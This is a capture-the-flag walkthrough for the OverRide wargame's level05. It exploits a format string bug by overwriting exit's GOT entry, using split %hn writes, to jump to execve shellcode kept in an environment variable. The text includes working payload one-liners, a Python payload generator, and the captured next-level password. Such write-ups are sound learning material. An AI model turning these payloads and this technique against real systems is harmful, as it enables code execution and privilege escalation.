
fuzzing phase

```
level05@OverRide:~$ ./level05
ssss
ssss

level05@OverRide:~$ ./level05
AbCdE
abcde

obiously some format string here

level05@OverRide:~$ ./level05
%p %p %p

level05@OverRide:~$ (python -c 'print "AAAA" + " %p " * 10') | ./level05
aaaa 0x64  0xf7fcfac0  0xf7ec3af9  0xffffd6bf  0xffffd6be  (nil)  0xffffffff  0xffffd744  0xf7fdb000  0x61616161

level05@OverRide:~$ (python -c 'print "AAAA" + " %10$p "') | ./level05
aaaa 0x61616161
```

lets jump into jdb 

```
   0x08048507 <main+195>:	call   0x8048340 <printf@plt>
   0x0804850c <main+200>:	movl   $0x0,(%esp)
   0x08048513 <main+207>:	call   0x8048370 <exit@plt>
```   
   its GOT obviously

```
call   0x8048370 <exit@plt>

(gdb) x 0x8048370
   0x8048370 <exit@plt>:	jmp    *0x80497e0
```

```
export shellcode=$(python -c 'print "\x90" * 300 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

```
x/600wx $esp
0xffffde60:	0x90909090	0x90909090	0x90909090	0x90909090


(gdb) p 0x80497e0  = 134518752
(gdb) p 0xffffde60 - 4 = 4294958684

```

```
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "%4294958684d%10$n"' ; cat) | ./level05 > /dev/null
id 1>&2
```

mmm smthg wrong

lets debug the assembly

```

=> 0x8048466 <main+34>:	movl   $0x64,0x4(%esp)
   0x804846e <main+42>:	lea    0x28(%esp),%eax
   0x8048472 <main+46>:	mov    %eax,(%esp)
   0x8048475 <main+49>:	call   0x8048350 <fgets@plt>
   
buffer of size 100 stored at esp + 0x28
```
```
0x08048495 <+81>:	cmp    $0x40,%al

0x080484a7 <+99>:	cmp    $0x5a,%al
```
The code checks if the character is less than or equal to 0x40, which corresponds to '@' in ASCII,
and if it is greater than 0x5a, which corresponds to 'Z' in ASCII.
If the character is within this range,
the code jumps to the main+135 address, which indicates that the input is invalid.

 0x080484cb <+135>:	addl   $0x1,0x8c(%esp)

```
'A' 0x41 65    XOR     32

01000001 = 65 = 'A'
XOR
00100000 = 32

01100001 = 97 = 'a'

python3 -c "print(65 ^ 32)"
97
```

```
level05@OverRide:~$ (python -c 'print "AAAA" + "BBBB" " %10$p %11$p"') | ./level05
aaaabbbb 0x61616161 0x62626262
```
the addresses in the stack are as follows
```
(gdb) x/900 $esp
0xffffd3c0
0xffffd3d0
0xffffd3e0
```
p 0xffffd3c0 = 4294955968

too long values, which results to negative value in signed 2's complement (-11328)

so we need to split the value if we want to properly override exit.GOT 

```
shellAddr = 0xMsbLsb
 
Lsb - 4 - 4 (already printed 2 addr)
Msb - Lsb = 0xffff - Lsb

exmpl:

0xffffdc59

(gdb) p 0xdc59 - 8 = 56401
(gdb) p 0xffff - 0xdc59 = 9126
```

As for the shellcode the while loop lower case the content of the buffer,
so it prevents us from executing any shellcode that contains bytes which values range between 0x40 and 0x5a.
we ll inject it in the env

```
get it while runtime

(gdb) p (char *)(getenv("shellcode"))
$5 = 0xffffddd6 
```

```
(gdb) x/900 $esp

0xffffdd00:	0x90909090	0x90909090	0x90909090	0x90909090

(gdb) p 0xdd00 - 8        = 56568
(gdb) p 0xffff - 0xdd00   = 8959


level05@OverRide:~$ (python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56568d%10$n%8959d%11$n"' ; cat) | ./level05 > /dev/null
whoami 1>&2
level06
pwd 1>&2
/home/users/level05
cat /home/users/level06/.pass 1>&2
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

```

```
define hook-stop
   x/10i $eip
   echo "\n--------------------\n"
   x/x 0x80497e0

r

=> 0x8048507 <main+195>:	call   0x8048340 <printf@plt>
   0x804850c <main+200>:	movl   $0x0,(%esp)
   0x8048513 <main+207>:	call   0x8048370 <exit@plt>
--------------------
"0x80497e0 <exit@got.plt>:	0x08048376

ni

--------------------
"0x80497e0 <exit@got.plt>:	0xffffdd00

```


```py
import struct

exit_addr = struct.pack ("I", 0x80497e0)
exit_addr += struct.pack ("I", 0x80497e0 + 2)
print exit_addr  + "%56984d%10$n" + "%8543d%11$n"
```

more organized syntax

```py
import struct

shell_addr = 0xffffdea0

exit_addr = struct.pack ("I", 0x80497e0)
exit_addr += struct.pack ("I", 0x80497e0 + 2)

shell_msb = shell_addr >> 16
shell_lsb = shell_addr & 0xffff


print exit_addr  + "%" + str(shell_lsb - 8) + "d%10$hn" + "%" + str(shell_msb - shell_lsb) + "d%11$hn"
```

```
level05@OverRide:~$ python /tmp/pyload.py > /tmp/pyload

level05@OverRide:~$ (cat /tmp/pyload; cat) | ./level05 > /dev/null
pwd 1>&2
/home/users/level05
cat /home/users/level06/.pass 1>&2
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
